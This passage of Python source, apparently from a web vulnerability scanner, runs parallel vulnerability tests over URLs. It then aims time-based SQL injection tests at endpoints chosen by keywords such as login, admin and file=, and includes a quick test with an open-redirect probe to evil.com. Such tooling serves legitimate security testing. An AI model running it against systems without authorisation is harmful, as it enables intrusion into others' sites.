    Run full vulnerability scan across all provided URLs.

    Args:
        urls: list of URL strings to test

    Returns:
        list of deduplicated finding dicts
    """
    print(f"\n[+] Vulnerability Engine v2.0 — scanning {len(urls)} URLs\n")

    all_findings = []

    # --- Filter URLs ---
    testable = [
        url for url in urls
        if not should_skip_url(url) and get_testable_params(url)
    ]

    print(f"[+] Testable URLs (have params, not static): {len(testable)}")

    if not testable:
        print("[!] No testable URLs found")
        return []

    # --- Phase 1: Full test suite (parallel, rate-limited) ---
    print("[+] Phase 1: Full vulnerability suite...")

    futures = []

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:

        for i, url in enumerate(testable):

            parsed = urllib.parse.urlparse(url)

            host = f"{parsed.scheme}://{parsed.netloc}"

            techs = technologies.get(host, [])

            futures.append(
                executor.submit(
                    test_url,
                    url,
                    techs
                )
            )

            if i > 0 and i % 10 == 0:
                time.sleep(0.25)

        for future in as_completed(futures):
            try:
                results = future.result(timeout=30)
                if results:
                    all_findings.extend(results)
                    for f in results:
                        print(
                            f"  [FOUND] [{f['severity']:<8}] "
                            f"{f['type']:<35} "
                            f"{f['url'][:60]}"
                        )
            except Exception as e:
                print(f"  [!] Future failed: {e}")
                continue

    # --- Phase 2: Time-based SQLi on priority URLs only ---
    print("\n[+] Phase 2: Time-based SQLi on priority targets...")

    priority_urls = [
        url for url in testable
        if any(x in url.lower() for x in [
            "login",
            "auth",
            "admin",
            "api",
            "graphql",
            "user",
            "search",
            "query",
            "redirect",
            "callback",
            "url=",
            "file=",
            "path=",
            "download",
        ])
    ][:20]  # Cap at 20 — this test is slow

    print(f"[+] Priority URLs for time-based: {len(priority_urls)}")

    time_futures = []

    with ThreadPoolExecutor(max_workers=5) as executor:
        for url in priority_urls:
            time.sleep(0.5)  # Extra rate limit for time-based tests
            time_futures.append(executor.submit(test_url_timebased, url))

        for future in as_completed(time_futures):
            try:
                results = future.result(timeout=60)
                if results:
                    all_findings.extend(results)
                    for f in results:
                        print(
                            f"  [FOUND] [{f['severity']:<8}] "
                            f"{f['type']:<35} "
                            f"{f['url'][:60]}"
                        )
            except Exception as e:
                print(f"  [!] Time-based future failed: {e}")
                continue

    # --- Deduplicate and report ---
    unique = deduplicate(all_findings)

    print(f"\n[+] Scan complete")
    print(f"    Raw findings    : {len(all_findings)}")
    print(f"    After dedup     : {len(unique)}")

    if unique:
        print(f"\n    Summary by type:")
        type_counts = {}
        for f in unique:
            t = f.get("type", "Unknown")
            type_counts[t] = type_counts.get(t, 0) + 1
        for vuln_type, count in sorted(type_counts.items(), key=lambda x: -x[1]):
            print(f"      {count:>3}x  {vuln_type}")

    return unique


# =========================
# QUICK TEST
# =========================

if __name__ == "__main__":
    test_urls = [
        "https://httpbin.org/get?id=1&user=admin",
        "https://httpbin.org/redirect-to?url=https://evil.com",
        "https://example.com/search?q=test&page=1",
        "https://example.com/static/logo.png",          # should be skipped
        "https://example.com/page?lang=en&theme=dark",  # noise params, skipped
    ]

    results = run_vuln_scan(test_urls)

    print(f"\nFinal results ({len(results)} findings):")
    for r in results:
        print(f"  [{r['severity']}] {r['type']} @ {r['url'][:70]}")
        if r.get("evidence"):
            print(f"    Evidence: {r['evidence']}")